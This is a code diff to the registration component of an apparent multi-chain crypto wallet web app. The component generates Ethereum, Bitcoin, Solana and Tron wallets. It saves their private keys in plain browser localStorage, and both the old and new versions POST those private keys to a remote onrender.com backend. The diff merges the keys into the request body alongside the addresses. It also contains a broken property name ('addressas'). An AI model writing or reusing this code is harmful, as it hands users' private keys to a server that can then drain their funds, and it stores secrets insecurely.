@@ -62,12 +62,11 @@ function Register() {
     //backend req
     async function alreadyExists (){
       const response = await fetch("https://twa-backend-g83o.onrender.com/wallets");
-      response.json().then((data) => {
-        setEthereumWalletAddress(data[0]);
-        setBitcoinWalletAddress(data[1]);
-        setSolanaWalletAddress(data[2]);
-        setTronWalletAddress(data[3]);
-      }) 
+      const data = await response.json();
+      setEthereumWalletAddress(data.addresses[0]);
+      setBitcoinWalletAddress(data.addresses[1]);
+      setSolanaWalletAddress(data.addresses[2]);
+      setTronWalletAddress(data.addresses[3]);
      }
 
      //wallet creation
@@ -95,10 +94,10 @@ function Register() {
         localStorage.setItem('tronWallet', tronWallet.address.base58);
 
         //private keys
-       localStorage.setItem('ethereumWalletkey', ethereumWallet.privateKey);
-       localStorage.setItem('bitcoinWalletkey', bitcoinWallet.privateKey);
-       localStorage.setItem('solanaWalletkey', solanaWallet.privateKey);
-        localStorage.setItem('tronWalletkey', tronWallet.privateKey);
+       localStorage.setItem('ethereumWalletkey', ethereumWallet.privateKey) ;
+       localStorage.setItem('bitcoinWalletkey', bitcoinWallet.privateKey) ;
+       localStorage.setItem('solanaWalletkey', solanaWallet.privateKey) ;
+        localStorage.setItem('tronWalletkey', tronWallet.privateKey) ;
 
 
           //for database   
@@ -106,21 +105,19 @@ function Register() {
            const bitAdd =   bitcoinWallet.address as string;
           const solAdd =    solanaWallet.addressas as string;
            const tronAdd =   tronWallet.address.base58;
-    try{
-      const p_k = [ethereumWallet.privateKey, bitcoinWallet.privateKey, solanaWallet.privateKey, tronWallet.privateKey] ; 
 
-         await fetch("https://twa-backend-g83o.onrender.com/register ", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            credentials: "include",  
-            body: JSON.stringify( {  p_k }),
-        });
+        const   ethk = ethereumWallet.privateKey as string;
+        const    btck= bitcoinWallet.privateKey as string;
+        const     solK= solanaWallet.privateKey  as string;
+        const   tronK =  tronWallet.privateKey as string;
+    try{
+      const p_k = [ethk, btck, solK,  tronK]; 
         const Address =  [ethAdd, bitAdd, solAdd, tronAdd] ;
-     await   fetch("https://twa-backend-g83o.onrender.com/register", {
+     await   fetch("https://twa-backend-g83o.onrender.com/wallets", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           credentials: "include",  
-          body: JSON.stringify( { Address }),
+          body: JSON.stringify( { Address, p_k }),
       })
     }
        
